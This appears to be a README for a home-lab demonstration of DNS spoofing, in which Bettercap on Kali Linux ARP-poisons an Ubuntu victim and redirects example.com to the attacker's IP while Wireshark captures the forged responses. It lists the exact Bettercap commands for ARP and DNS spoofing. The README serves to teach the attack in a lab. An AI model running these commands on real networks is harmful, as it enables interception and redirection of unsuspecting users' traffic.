# DNS Spoofing with Bettercap and Wireshark

## Project Overview
This project demonstrates DNS spoofing using Bettercap on Kali Linux and monitoring the traffic with Wireshark. The goal is to intercept and modify DNS responses, redirecting traffic to a different IP address.

## Tools Used
- **Bettercap**: A powerful tool for network attacks like ARP poisoning and DNS spoofing.
- **Wireshark**: A network protocol analyzer to capture and monitor network traffic.
- **Kali Linux**: A penetration testing and security auditing Linux distribution.

## Prerequisites
- Kali Linux (installed with Bettercap and Wireshark)
- Ubuntu machine (as a victim machine)
- Network setup with both machines connected to the same network

## Step-by-Step Guide

### 1. Setting up Bettercap for DNS Spoofing

- Launch Bettercap in a terminal:
  ```bash
  sudo bettercap -iface eth0
# dns-spoofing-with-wireshark

Demonstrating DNS spoofing using Bettercap and monitoring with Wireshark
Enable ARP spoofing and DNS spoofing:
arp.spoof on
set dns.spoof.domains example.com
set dns.spoof.address 172.18.245.18
dns.spoof on
### 2. Setting up Wireshark to Capture DNS Traffic

- Open a second terminal and launch Wireshark
- Select the appropriate network interface (e.g., eth0 or wlan0).
- Apply the filter dns to capture only DNS packets.
### 3. Pinging example.com from the Victim Machine

- On your Ubuntu victim machine, ping the domain:

bash
Copy
Edit
ping example.com
-Observe in Wireshark how the DNS query for example.com resolves to the IP address of your Kali machine (DNS spoofing in action).
### 4. Verifying the Attack
In Wireshark, look for DNS responses and verify that example.com resolves to the spoofed IP address.
### 5. Conclusion
This demonstrates how DNS spoofing can redirect traffic to an attacker-controlled IP. Wireshark helps visualize the traffic, making it easier to undersatnd teh attack

